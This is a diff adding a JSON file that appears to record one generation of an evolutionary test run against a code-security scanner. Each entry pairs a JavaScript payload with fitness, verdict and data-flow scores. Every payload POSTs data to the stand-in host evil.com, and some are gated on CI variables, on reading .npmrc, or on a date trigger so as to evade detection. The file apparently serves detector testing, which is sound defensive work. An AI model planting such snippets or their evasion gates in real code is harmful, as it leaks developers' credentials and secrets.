@@ -1,0 +1,83 @@
+{
+  "generation": 8,
+  "population": [
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);",
+      "fitness": 39.15,
+      "isNovel": false,
+      "impact": 44,
+      "verdict": "REVIEW",
+      "confidence": 0.03,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (process.env.CI === 'true') { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x); }",
+      "fitness": 18.799999999999997,
+      "isNovel": false,
+      "impact": 61,
+      "verdict": "REVIEW_INTENT_DRIFT",
+      "confidence": 0.99,
+      "graph": [
+        "SECRET → NETWORK",
+        "SYSTEM → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (require('fs').readFileSync('.npmrc', 'utf8') === 'true') { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);  }",
+      "fitness": 18.799999999999997,
+      "isNovel": false,
+      "impact": 61,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "SYSTEM → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (Date.now() > 1700000000000) { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x); } ",
+      "fitness": 18.799999999999997,
+      "isNovel": false,
+      "impact": 61,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);  ",
+      "fitness": 18.799999999999997,
+      "isNovel": false,
+      "impact": 61,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null);",
+      "fitness": 18.799999999999997,
+      "isNovel": false,
+      "impact": 61,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (Date.now() > 1700000000000) { if (require('fs').readFileSync('.npmrc', 'utf8') === 'true') { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null); } }",
+      "fitness": 18.799999999999997,
+      "isNovel": false,
+      "impact": 61,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "SYSTEM → NETWORK"
+      ]
+    }
+  ]
+}
